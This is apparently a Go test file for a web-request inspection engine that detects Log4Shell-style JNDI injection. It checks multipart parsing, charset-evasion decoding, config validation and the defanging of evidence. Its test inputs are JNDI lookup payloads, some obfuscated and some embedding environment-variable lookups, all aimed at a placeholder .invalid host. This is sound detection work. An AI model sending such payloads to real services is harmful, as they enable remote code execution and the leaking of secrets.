package engine

import (
	"encoding/json"
	"strings"
	"sync"
	"testing"
)

func TestMultipartParts(t *testing.T) {
	const payload = "${jndi:ldap://x.invalid/a}"
	body := func(nl string) string {
		return "--B" + nl + `Content-Disposition: form-data; name="f"; filename="` + payload + `.txt"` + nl +
			"X-Custom: v" + nl + nl + "plain" + nl + "--B" + nl +
			`Content-Disposition: form-data; name="n"` + nl + nl + payload + nl + "--B--" + nl
	}
	for _, nl := range []string{"\r\n", "\n"} {
		fields, b := extractFields(withBody(newReq("POST", "/"), `multipart/form-data; boundary="B"`, body(nl)), Config{}.withDefaults())
		if b != BudgetNone {
			t.Fatalf("budget %v", b)
		}
		got := map[string]string{}
		for _, f := range fields {
			got[f.loc.String()] = f.text
		}
		for loc, want := range map[string]string{
			"multipart-name":            "n",
			"multipart-filename:f":      payload + ".txt",
			"multipart-header:X-Custom": "v",
			"multipart-value:f":         "plain",
			"multipart-value:n":         payload,
		} {
			if got[loc] != want {
				t.Errorf("nl=%q: %s = %q, want %q", nl, loc, got[loc], want)
			}
		}
	}
}

func TestMultipartDetection(t *testing.T) {
	const p = "${jndi:ldap://x.invalid/a}"
	cases := map[string]string{
		"filename": `Content-Disposition: form-data; name="f"; filename="` + p + `"` + "\r\n\r\ndata",
		"value":    `Content-Disposition: form-data; name="f"` + "\r\n\r\n" + p,
		"header":   `Content-Disposition: form-data; name="f"` + "\r\nX-Meta: " + p + "\r\n\r\ndata",
	}
	for name, part := range cases {
		v := Inspect(withBody(newReq("POST", "/"), "multipart/form-data; boundary=B", "--B\r\n"+part+"\r\n--B--\r\n"), Config{})
		if v.Decision != DecisionMalicious || !v.Has(RuleJNDI) {
			t.Errorf("%s: %v %v", name, v.Decision, ruleSet(v))
		}
	}
}

func TestMultipartMalformedIsTolerated(t *testing.T) {
	for _, body := range []string{"", "--B", "--B\r\nno blank line", "garbage", "--B\r\n\r\n", "--B--"} {
		_ = Inspect(withBody(newReq("POST", "/"), "multipart/form-data; boundary=B", body), Config{})
	}
	// No boundary: only the whole body is inspected.
	v := Inspect(withBody(newReq("POST", "/"), "multipart/form-data", "${jndi:ldap://x.invalid/a}"), Config{})
	if !v.Has(RuleJNDI) {
		t.Error("body without boundary not inspected")
	}
}

func TestHeaderParam(t *testing.T) {
	tests := []struct{ value, param, want string }{
		{`form-data; name="a"; filename="b.txt"`, "filename", "b.txt"},
		{`form-data; NAME=a`, "name", "a"},
		{`form-data; name="a"`, "boundary", ""},
		{`form-data`, "name", ""},
		{`form-data; name`, "name", ""},
		{`form-data; name="`, "name", `"`},
	}
	for _, tc := range tests {
		if got := headerParam(tc.value, tc.param); got != tc.want {
			t.Errorf("headerParam(%q, %q) = %q, want %q", tc.value, tc.param, got, tc.want)
		}
	}
}

func TestConfigValidate(t *testing.T) {
	if err := (Config{}).Validate(); err != nil {
		t.Errorf("zero config: %v", err)
	}
	if err := (Config{Disabled: []RuleID{RuleLookupSyntax, RuleLookupDepth}}).Validate(); err != nil {
		t.Errorf("valid disable: %v", err)
	}
	err := Config{
		Disabled:  []RuleID{"LSH-9999", RuleDecodeBudget},
		MaxFields: -1,
		Limits:    Limits{MaxDepth: -2},
	}.Validate()
	if err == nil {
		t.Fatal("want error")
	}
	for _, want := range []string{`unknown rule "LSH-9999"`, "LSH-3001", "MaxFields", "Limits.MaxDepth"} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("error lacks %q: %v", want, err)
		}
	}
	if err.Error() != (Config{Disabled: []RuleID{"LSH-9999", RuleDecodeBudget}, MaxFields: -1, Limits: Limits{MaxDepth: -2}}).Validate().Error() {
		t.Error("Validate output is not deterministic")
	}
}

func TestVerdictJSON(t *testing.T) {
	v := Inspect(newReq("GET", "/", "User-Agent", "${${lower:j}ndi:ldap://${env:A}.x.invalid/a}"), Config{})
	out, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	for _, want := range []string{`"Decision":"malicious"`, `"Severity":"malicious"`, `"Rule":"LSH-1002"`} {
		if !strings.Contains(s, want) {
			t.Errorf("JSON lacks %s: %s", want, s)
		}
	}
	if strings.Contains(s, "${") {
		t.Errorf("JSON verdict contains an unsafe ${ sequence: %s", s)
	}
}

func TestRuleIDs(t *testing.T) {
	v := Inspect(newReq("GET", "/?a=${jndi:ldap://x.invalid/a}", "User-Agent", "${jndi:ldap://x.invalid/a}"), Config{})
	ids := v.RuleIDs()
	if len(ids) != 1 || ids[0] != RuleJNDI {
		t.Errorf("RuleIDs = %v", ids)
	}
	if got := (Verdict{}).RuleIDs(); got != nil {
		t.Errorf("empty RuleIDs = %v", got)
	}
}

// Inspect has no shared mutable state and must be safe to call from many
// goroutines (run under -race).
func TestInspectConcurrent(t *testing.T) {
	reqs := []Request{
		newReq("GET", "/?q=hello", "User-Agent", "curl/8"),
		newReq("GET", "/", "X-Api", "${${lower:j}ndi:ldap://x.invalid/a}"),
		newReq("GET", "/?q=%2524%257Bjndi%253Aldap%253A%252F%252Fx.invalid%252Fa%257D"),
	}
	want := make([]Verdict, len(reqs))
	for i, r := range reqs {
		want[i] = Inspect(r, Config{})
	}
	var wg sync.WaitGroup
	for g := 0; g < 8; g++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for n := 0; n < 200; n++ {
				i := n % len(reqs)
				got := Inspect(reqs[i], Config{})
				if got.Decision != want[i].Decision || len(got.Detections) != len(want[i].Detections) {
					t.Errorf("request %d: concurrent verdict differs", i)
					return
				}
			}
		}()
	}
	wg.Wait()
}

func TestCharsetDifferentials(t *testing.T) {
	const p = "${jndi:ldap://x.invalid/a}"
	utf16le := func(s string) string {
		var b []byte
		for _, r := range s {
			b = append(b, byte(r), 0)
		}
		return string(b)
	}
	utf16be := func(s string) string {
		var b []byte
		for _, r := range s {
			b = append(b, 0, byte(r))
		}
		return string(b)
	}
	utf32le := func(s string) string {
		var b []byte
		for _, r := range s {
			b = append(b, byte(r), 0, 0, 0)
		}
		return string(b)
	}
	// ebcdic encodes by inverting the table.
	ebcdic := func(s string) string {
		out := make([]byte, 0, len(s))
		for i := 0; i < len(s); i++ {
			for b, c := range ebcdicTable {
				if c == s[i] {
					out = append(out, byte(b))
					break
				}
			}
		}
		return string(out)
	}
	cases := []struct {
		name, ct, body string
	}{
		{"utf-16le", "text/plain; charset=utf-16le", utf16le(p)},
		{"utf-16be", "text/plain; charset=UTF-16BE", utf16be(p)},
		{"utf-32le", "application/json; charset=utf-32le", utf32le(p)},
		{"utf-16 without charset", "text/plain", utf16le(p)},
		{"ibm037", "text/plain; charset=IBM037", ebcdic(p)},
		{"cp500", "text/plain; charset=cp500", ebcdic(p)},
		{"ibm1047", "text/plain; charset=ibm1047", ebcdic(p)},
		{"ebcdic quoted", `text/plain; charset="ebcdic-cp-us"`, ebcdic(p)},
	}
	for _, tc := range cases {
		v := Inspect(withBody(newReq("POST", "/"), tc.ct, tc.body), Config{})
		if v.Decision != DecisionMalicious || !v.Has(RuleJNDIEvasive) {
			t.Errorf("%s: %v %v", tc.name, v.Decision, ruleSet(v))
		}
	}
	// Percent-encoded UTF-16 in a query string.
	v := Inspect(newReq("GET", "/?q=%24%00%7B%00j%00n%00d%00i%00:%00l%00d%00a%00p%00:%00/%00/%00x%00.%00i%00n%00v%00a%00l%00i%00d%00/%00a%00%7D%00"), Config{})
	if v.Decision != DecisionMalicious {
		t.Errorf("utf-16 query: %v %v", v.Decision, ruleSet(v))
	}
	// Ordinary charsets are left alone.
	for _, cs := range []string{"utf-8", "iso-8859-1", "shift_jis", "gb2312", "windows-1252", ""} {
		ct := "text/plain"
		if cs != "" {
			ct += "; charset=" + cs
		}
		if v := Inspect(withBody(newReq("POST", "/"), ct, "hello world"), Config{}); v.Decision != DecisionClean {
			t.Errorf("charset %q: %v %v", cs, v.Decision, ruleSet(v))
		}
	}
}

func TestEBCDICLabel(t *testing.T) {
	for _, l := range []string{"IBM037", "cp037", "ibm-37", "CP500", "ibm1047", "EBCDIC-CP-US", "ebcdic"} {
		if !ebcdicLabel(l) {
			t.Errorf("ebcdicLabel(%q) = false", l)
		}
	}
	for _, l := range []string{"", "utf-8", "us-ascii", "iso-8859-1", "windows-1252", "cp1252", "cp936", "ibm866"} {
		if ebcdicLabel(l) {
			t.Errorf("ebcdicLabel(%q) = true", l)
		}
	}
}

// Regression: the lookup prefix used as evidence was not defanged, so a request
// such as "${${:0" put an active "${" into the verdict (found by FuzzInspect).
func TestEvidenceIsAlwaysDefanged(t *testing.T) {
	for _, in := range []string{"${${:0", "${${lower:A}${:x}:y}", "${jndi:${::-${env:A}}://x.invalid/${sys:b}}", "${${env:A}${env:B}:z}"} {
		v := Inspect(newReq("GET", "/", "X", in), Config{})
		for _, d := range v.Detections {
			for _, text := range append([]string{d.Evidence, d.Scheme}, d.KeyLookups...) {
				if strings.Contains(text, "${") {
					t.Errorf("%q: %s carries an active lookup %q", in, d.Rule, text)
				}
			}
		}
	}
}

func TestEffectiveFillsDefaults(t *testing.T) {
	e := Config{MaxFields: 5}.Effective()
	if e.MaxFields != 5 || e.MaxRequestBytes != 4<<20 || e.MaxWorkBytes != 32<<20 || e.NestingSuspicious != 4 || e.Limits.MaxDepth == 0 {
		t.Errorf("Effective = %+v", e)
	}
}
